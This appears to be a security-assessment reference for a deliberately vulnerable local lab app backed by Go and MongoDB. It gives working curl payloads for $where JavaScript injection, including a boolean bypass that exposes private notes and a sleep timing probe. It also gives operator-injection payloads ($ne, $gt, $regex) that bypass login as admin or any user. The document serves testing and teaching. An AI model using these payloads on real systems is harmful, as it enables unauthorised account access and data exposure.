Exploitation reference for security assessment. App1 – VULN-A and VULN-B (NoSQL injection).

VULN-A Detecting NoSQL Injection

Endpoint: GET /search?q=<value>

Mechanism: The q parameter is interpolated into a MongoDB $where JavaScript expression without escaping. Injecting JS operators alters query behaviour in detectable ways.

Detection technique 1 – Syntax error:

# Single quote breaks JS string → MongoDB returns an error
curl "http://localhost:8081/search?q='"
# Response: "Search could not be completed: ..."
# → Confirms the value is evaluated as JavaScript

Detection technique 2 – Boolean bypass (returns all notes incl. private):

# Normal search – only matching public notes returned
curl "http://localhost:8081/search?q=governance"

# Injected – always-true condition returns ALL notes (including private)
# URL-encode the payload: test') || (1==1) && ('
curl "http://localhost:8081/search?q=test%27)%20%7C%7C%20(1%3D%3D1)%20%26%26%20(%27"

Detection technique 3 – Time delay:

# 3-second server delay confirms code execution
curl -w "\nTime: %{time_total}s\n" \
  "http://localhost:8081/search?q=test%27)%3B%20sleep(3000)%3B%20(%27"

Why it works: $where evaluates a JavaScript function on every document. User input is interpolated directly into the JS string via fmt.Sprintf with no escaping.

VULN-B NoSQL Operator Injection – Auth Bypass

Endpoint: POST /login — Content-Type: application/json

Mechanism: The JSON body is decoded into interface{} fields. When the password value is a JSON object like {"$ne": null}, the Go mongo-driver serialises it as a BSON operator, making the filter match any user with a non-null password.

# Bypass as admin (specific user, any password)
curl -s -X POST http://localhost:8081/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":null}}'

# Bypass as first user in collection (no username needed)
curl -s -X POST http://localhost:8081/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# Password regex match (matches any password)
curl -s -X POST http://localhost:8081/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"editor","password":{"$regex":".*"}}'

Why it works: json.Unmarshal decodes {"$ne": null} into map[string]interface{}{"$ne": nil}. When this is placed in a bson.D element, the Go driver renders it as the BSON operator {$ne: null}, turning an equality check into an inequality check that matches everything.
